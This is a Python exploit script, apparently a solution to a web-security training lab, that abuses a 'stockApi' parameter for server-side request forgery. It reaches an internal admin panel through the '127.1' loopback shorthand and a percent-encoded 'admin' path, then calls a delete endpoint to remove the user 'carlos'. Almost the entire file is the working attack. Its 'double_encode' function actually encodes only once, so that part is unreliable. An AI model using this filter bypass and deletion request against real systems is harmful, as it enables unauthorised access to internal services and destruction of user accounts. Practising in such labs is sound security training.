import requests
import sys
import urllib3
urllib3.disable_warnings()

def double_encode(chars):
    data=""
    for c in chars:
        data+="%"+hex(ord(c))[2:]
    return data

try:
    url=sys.argv[1]

except IndexError:
    print(f"[+] Syntax : python3 {sys.argv[0]} <url>")


if __name__=='__main__':
    path='/product/stock'
    s=requests.Session()
    content={'Content-Type': 'application/x-www-form-urlencoded'}
    enc=double_encode("admin")
    res={
        'stockApi':f'http://127.1/{enc}'
    }
    r=s.post(url+path,headers=content,data=res)
    if r:
        print("[+] Access")
        if res['stockApi']!='' and 'carlos' in r.text:
            print('[+] Delete carlos user ..')
            res['stockApi']+="/delete?username=carlos"
            r=s.post(url+path,headers=content,data=res)
            print('[+] Complete ')
        else:
            print('[-] No carlos HERE')
    else:
        print('[-] Not Found')

    